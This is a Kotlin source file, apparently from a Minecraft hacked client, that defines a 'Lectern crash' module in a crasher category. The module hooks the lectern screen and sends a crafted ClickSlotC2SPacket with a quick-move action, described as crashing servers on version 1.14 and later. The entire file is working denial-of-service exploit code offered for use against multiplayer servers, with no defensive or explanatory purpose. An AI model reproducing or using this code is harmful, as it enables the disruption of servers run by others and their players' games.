package net.tarasandedevelopment.tarasande.module.crasher

import com.google.common.collect.Lists
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap
import net.minecraft.client.MinecraftClient
import net.minecraft.client.gui.screen.ingame.LecternScreen
import net.minecraft.item.ItemStack
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket
import net.minecraft.screen.slot.SlotActionType
import net.tarasandedevelopment.tarasande.base.module.Module
import net.tarasandedevelopment.tarasande.base.module.ModuleCategory
import net.tarasandedevelopment.tarasande.util.exploit.ExploitInjector

class ModuleLecternCrash : Module("Lectern crash", "Crashes the server using lecterns on 1.14+", ModuleCategory.CRASHER) {

    init {
        ExploitInjector.hook(LecternScreen::class.java, "Lectern Crash 1.14+", object : ExploitInjector.Action {
            override fun on() {
                val screenHandler = MinecraftClient.getInstance().player!!.currentScreenHandler

                val defaultedList = screenHandler.slots
                val i = defaultedList.size

                val list = Lists.newArrayListWithCapacity<ItemStack>(i)

                for (slot in defaultedList) {
                    list.add(slot.stack.copy())
                }

                val int2ObjectMap = Int2ObjectOpenHashMap<ItemStack>()

                for (slot2 in 0 until i) {
                    val stack = list[slot2]
                    val stackCopy = defaultedList[slot2].stack

                    if (!ItemStack.areEqual(stack, stackCopy))
                        int2ObjectMap[slot2] = stackCopy.copy()
                }

                MinecraftClient.getInstance().networkHandler!!.connection.send(ClickSlotC2SPacket(
                    screenHandler.syncId,
                    screenHandler.revision,
                    0,
                    0,
                    SlotActionType.QUICK_MOVE,
                    screenHandler.cursorStack.copy(),
                    int2ObjectMap
                ))
            }
        }, this)
    }
}
